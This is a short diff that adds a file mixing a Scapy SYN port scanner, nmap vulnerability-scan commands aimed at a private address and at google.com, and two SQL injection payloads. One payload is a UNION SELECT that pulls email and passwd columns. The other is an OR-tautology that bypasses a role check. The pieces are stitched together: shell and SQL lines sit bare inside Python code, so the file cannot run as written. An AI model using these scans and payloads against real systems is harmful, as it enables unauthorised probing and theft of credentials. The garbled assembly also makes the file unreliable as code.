@@ -1,0 +1,23 @@
+from scapy.all import *
+
+target_ip = "www.example.com"
+ports = [22, 80, 443]
+
+for port in ports:
+    packet = IP(dst=target_ip) / TCP(dport=port, flags="S")
+    response = sr1(packet, timeout=1, verbose=0)
+
+    if response:
+        if response.haslayer(TCP):
+            if response[TCP].flags == "SA":
+                print(f"Port {port} is open")
+            elif response[TCP].flags == "RA":
+                print(f"Port {port} is closed")
+
+nmap --script vuln 192.168.1.10
+nmap --script vuln 192.168.1.10 -oN result.txt
+nmap -Pn --script vuln google.com -oN result.txt
+
+xx' IN(itemnum,sdesc,ldesc) UNION SELECT email, passwd
+
+' OR role='S' -- 
